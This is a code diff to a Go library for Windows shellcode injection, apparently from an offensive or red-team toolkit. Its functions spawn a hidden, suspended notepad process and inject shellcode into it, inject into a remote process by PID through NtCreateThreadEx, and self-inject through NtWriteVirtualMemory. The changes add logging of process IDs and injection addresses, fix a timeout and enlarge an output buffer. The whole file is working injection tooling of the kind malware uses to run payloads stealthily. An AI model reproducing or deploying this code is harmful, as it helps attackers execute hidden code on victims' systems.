@@ -7,6 +7,7 @@ import (
 	"debug/pe"
 	"errors"
 	"fmt"
+	"log"
 	"strconv"
 	"strings"
 	"syscall"
@@ -69,9 +70,11 @@ func SpawnInjectReadPipe(shellcode []byte, args []string) (string, error) {
 	sa.ShowWindow = windows.SW_HIDE
 	pi := windows.ProcessInformation{}
 	err = windows.CreateProcess(nil, notepad, nil, nil, true, windows.CREATE_NO_WINDOW|windows.CREATE_SUSPENDED, nil, nil, &sa, &pi)
+	//err = windows.CreateProcess(nil, notepad, nil, nil, true, windows.CREATE_SUSPENDED, nil, nil, &sa, &pi)
 	if err != nil {
 		return "", err
 	}
+	log.Printf("Process pid %d\n", pi.ProcessId)
 	windows.CloseHandle(pi.Thread)
 	windows.CloseHandle(windows.Handle(hChildStdoutWrite))
 	windows.CloseHandle(windows.Handle(hChildStdinRead))
@@ -100,7 +103,7 @@ func SpawnInjectReadPipe(shellcode []byte, args []string) (string, error) {
 	var loops int
 	for {
 		if mins != 0 {
-			if loops > mins {
+			if loops > (mins * 60) {
 				break
 			}
 		}
@@ -117,7 +120,7 @@ func SpawnInjectReadPipe(shellcode []byte, args []string) (string, error) {
 	}
 	windows.TerminateProcess(pi.Process, 0)
 	windows.CloseHandle(pi.Process)
-	buffer := make([]byte, 10)
+	buffer := make([]byte, 1024)
 	var nRead uint32
 	var results string
 	for {
@@ -263,22 +266,23 @@ func RemoteInjectReturnThread(shellcode []byte, pid string) (syscall.Handle, uin
 	}
 	var remoteThread uintptr
 	err4 := rawapi.NtCreateThreadEx( //NtCreateThreadEx
-		&remoteThread,          //hthread
-		0x1FFFFF,               //desiredaccess
-		0,                      //objattributes
-		uintptr(procHandle),    //processhandle
-		uintptr(lpBaseAddress), //lpstartaddress
-		0,                      //lpparam
-		uintptr(0),             //createsuspended
-		0,                      //zerobits
-		0,                      //sizeofstackcommit
-		0,                      //sizeofstackreserve
-		0,                      //lpbytesbuffer
+		&remoteThread,                    //hthread
+		0x1FFFFF,                         //desiredaccess
+		0,                                //objattributes
+		uintptr(procHandle),              //processhandle
+		uintptr(lpBaseAddress),           //lpstartaddress
+		0,                                //lpparam
+		uintptr(winapi.CREATE_SUSPENDED), //createsuspended
+		0,                                //zerobits
+		0,                                //sizeofstackcommit
+		0,                                //sizeofstackreserve
+		0,                                //lpbytesbuffer
 	)
 	if err4 != nil {
 		windows.CloseHandle(windows.Handle(procHandle))
 		return 0, 0, err
 	}
+	log.Printf("Code Injected Here %p\n", unsafe.Pointer(lpBaseAddress))
 	return syscall.Handle(remoteThread), lpBaseAddress, nil
 }
 
@@ -390,10 +394,10 @@ func RawSelfInject(shellcode []byte) (string, error) {
 		return "", err
 	}
 	var written uint32
-	err2 := rawapi.NtWriteVirtualMemory(rawapi.ThisThread, baseA, (uintptr)(unsafe.Pointer(&shellcode[0])), uintptr(len(shellcode)), &written)
-	if err2 != nil {
+	err = rawapi.NtWriteVirtualMemory(rawapi.ThisThread, baseA, (uintptr)(unsafe.Pointer(&shellcode[0])), uintptr(len(shellcode)), &written)
+	if err != nil {
 		rawapi.NtFreeVirtualMemory(rawapi.ThisThread, baseA, freed, windows.MEM_RELEASE)
-		return "", err2
+		return "", err
 	}
 	var lens uintptr = uintptr(shellcodeLen)
 	var oldprot uint32
@@ -403,7 +407,7 @@ func RawSelfInject(shellcode []byte) (string, error) {
 		return "", err
 	}
 	var hhosthread uintptr
-	err3 := rawapi.NtCreateThreadEx( //NtCreateThreadEx
+	err = rawapi.NtCreateThreadEx( //NtCreateThreadEx
 		&hhosthread,       //hthread
 		0x1FFFFF,          //desiredaccess
 		0,                 //objattributes
@@ -417,9 +421,9 @@ func RawSelfInject(shellcode []byte) (string, error) {
 		0,                 //lpbytesbuffer
 	)
 	// cleanup
-	if err3 != nil {
+	if err != nil {
 		rawapi.NtFreeVirtualMemory(rawapi.ThisThread, baseA, freed, windows.MEM_RELEASE)
-		return "", err3
+		return "", err
 	}
 	go func() {
 		windows.WaitForSingleObject(windows.Handle(hhosthread), windows.INFINITE)
